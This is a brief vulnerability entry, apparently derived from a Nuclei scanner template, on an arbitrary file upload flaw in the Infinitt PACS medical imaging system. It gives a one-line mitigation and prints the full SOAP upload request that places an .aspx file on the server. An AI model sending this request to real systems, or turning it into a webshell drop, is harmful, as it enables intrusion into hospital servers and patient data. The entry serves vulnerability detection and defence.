# Vulnerability: Infinitt PACS System - Arbitary File Upload
**Classification:** INFINITT
**Source:** Nuclei Template (`infinitt-pacs-file-upload.yaml`)

## Description
Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.

## Secure Mitigation
Ensure that file uploads are properly validated and sanitized. Implement strict access controls and monitoring to detect and prevent unauthorized file uploads.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /webservices/WebJobUpload.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
Soapaction: "http://rainier/jobUpload"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>{{filename}}.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```

